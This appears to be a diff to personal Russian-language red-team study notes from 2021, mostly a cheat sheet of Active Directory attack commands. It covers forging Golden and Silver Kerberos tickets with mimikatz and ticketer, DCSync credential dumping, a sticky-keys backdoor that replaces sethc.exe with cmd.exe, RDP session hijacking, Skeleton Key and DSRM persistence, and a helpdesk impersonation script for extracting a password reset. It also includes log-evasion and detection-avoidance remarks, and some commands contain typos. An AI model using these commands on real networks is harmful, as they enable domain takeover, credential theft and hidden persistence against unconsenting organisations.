@@ -1692,10 +1692,39 @@ Purple Team - следит за ходом и дает подсказуи отс
 Если понимаешь "Ага, тут я мог спалится", то лучше отвлечь внимаение ложным следом
 
 Сценарий:
-звоним в техподдержку, представляемся 
+звоним в техподдержку, представляемся топ менеджером и нагнетаем остановку. Сводм к "сбросте мне пароль"
 
-Интерфейс кали можно сделать пожожим на линукс 
+Интерфейс кали можно сделать пожожим на Windows 10
 $ kali-undercover
+
+
+
+Golden Ticket (not ReadTeam)
+Нельзя использовать ntlm хеш при генераци ключа (только есл заказчик не использует des у себя)
+mimikatz # kerbberos::golden /user:evil /domain:<petest.local /sid:<S-1-5-21...> /krbtgt:<d125e4f69ec95...> /ticket:evil.tck /ptt
+$ python ticketer.py -nthash <b8aa706788a...> -domain-sid S-1-5-21...> -domain PENTEST.local administrator
+
+
+
+Golden Ticket 
+mimikatz # lsadump::dcsync /domain:rd.adsecurity.org /user:Administrator
+mimikatz # kereros::golden /domain:la.ropnop.com /sid:<S-1-5-21...> /aes256:<abb8e586f33...> /user:mini /target:<ws03win10.lab.ropnop.com> /service:cifs
+$ ./secretsdump_linux_x86_64 -just-dc-user <wmuser> LA/agreen@pdc01.lab.ropnop.com
+$ ./ticketer_linux_x86_64 -aesKey <5d87354235aadfc...> -domain-sid <S-1-5-21...> -domain la.ropnop.com -duration 1 HelloThere
+
+
+
+Silver Ticket
+$ ./ticketer_linux_x86_64 -aesKey <224351fcd4447...> -domain-sid <S-1-5-21...> -domain lab.ropnop.com -spn cifs/<ws03win10.lab.ropnop.com> SilverHelloThere
+
+
+
+DCsync
+Avoid suspicious logs
+C:\> Invoke-Mimikatz -Command '"kerberos::golden /user:dcorp-dc$ /domai:dollarcorp.money.local /sid:<S-1-5-21-2578...>,<S-1-5-9> /krbtgt:<ff46a98d66c...> /ppt"'
+C:\> Invoke-Mimikatz -Command '"lsadump::dcsync /user:mcorp\Administrator /domain:moneycorp.local"'
+S-1-5-21-2578...	Domain Controllers
+S-1-5-9		Enterprise Domain Controllers
 
 
 
@@ -1712,13 +1741,38 @@ $ kali-undercover
 
 C:\> takeown /f <file>
 
+
+
+Digispark 
+Микроконтроллер, bad usb
+Павел хорошо в этом разбирается, стоит поиграться с этим 
+
+
+
 Persistent sticky keys
-админ консоль при залипании клавиш
+Консоль с правам системы при залипании клавиш (Палится Deffender, Kasperskiy и т.п.)
+C:\> REG ADD "HKLM\SOFTWARE\Microsoft\Windows\WindowsNT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t
+C:\> REG_SZ /d "C:\windows\system32\cmd.exe"
+
+Из заметок Павла
+C:\> cd \
+C:\> cd windows\system32
+C:\> icalcs C:\windows\system32\sethc.exe /save C:\windows\system32\sethc.ACLFile /T
+C:\> takeown /f sethc.exe
+C:\> icacls sethc.exe /grant administrators:f
+C:\> icacls C:\windows\system32\cmd.exe /save C:\windows\system32\cmd.ACLFile /T
+C:\> takeown /f cmd.exe
+C:\> icacls cmd.exe /grant administrators:f
+C:\> echo yes | copy C:\windows\system32\sethc.exe C:\windows\system32\sethcexe.BAK
+C:\> echo yes | copy C:\windows\system32\cmd.exe C:\windows\system32\sethc.exe
+
 msf6> search sticky_keys
 
 
+
+
 Угон RDP сессии
-C:\> quser		Просмореть список акивных RDP сессий
+C:\> quser			Просмореть список акивных RDP сессий
 C:\> query user		Или так
 C:\> tscon <id>		Угоняем активную сессию
 
@@ -1730,8 +1784,25 @@ GCB
 
 
 
+DSRM 
+на домен контролерах есть ненужный аккаунт локального админа
+C:\> HKLM:\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonehavior
+	0 (default) Account can e used only when DC is in DSRM
+	1 Account can be used when local AD DS service is stopped
+	2 Account can e used always
+Меняем пароль с помощью NTDSUtil
+
+
+
+Создать пользователя, который может менять пароли ВСЕМ, при этом не являясь админом
+C:\> Get-ADUser <username> | Set-ADObject -Clear adminCount
+C:\> Get-ADUser <username> | Set-ADObject -Add @{adminCount=1}
+Атака сложная, нужно дополнительно изучить
+
+
+
 Skeleton Key 
-Добавляем второй пароль, не нарушая работу старого. Нужно сделать на всех контроллерах домена, сбрасывается при перезагрузке
+Добавляем второй пароль, не нарушая работу старого. Нужно сделать на всех контроллерах домена, сбрасывается при перезагрузке, хорошо работает только на 2008 сервере
 # mimikatz.exe
 # privilege::debug
 # misc::skeleton
@@ -1739,10 +1810,12 @@ C:\> net use x: \\dc-01\admin$ /user:jeff mimikatz	Входим по кербе�
 
 
 
-Набор материала по Persistence 
+##### Набор материала по закреплению на винде #####
 https://github.com/infosecn1nja/AD-Attack-Defence/blob/master/README.md#persistence
 
 
-лука сафонов 2 лекции по АД
+
+youtube.com  лука сафонов 2 лекции по АД 
+
 Книга Windows Internals обязательно прочитать!
 22:03 23.04.2021
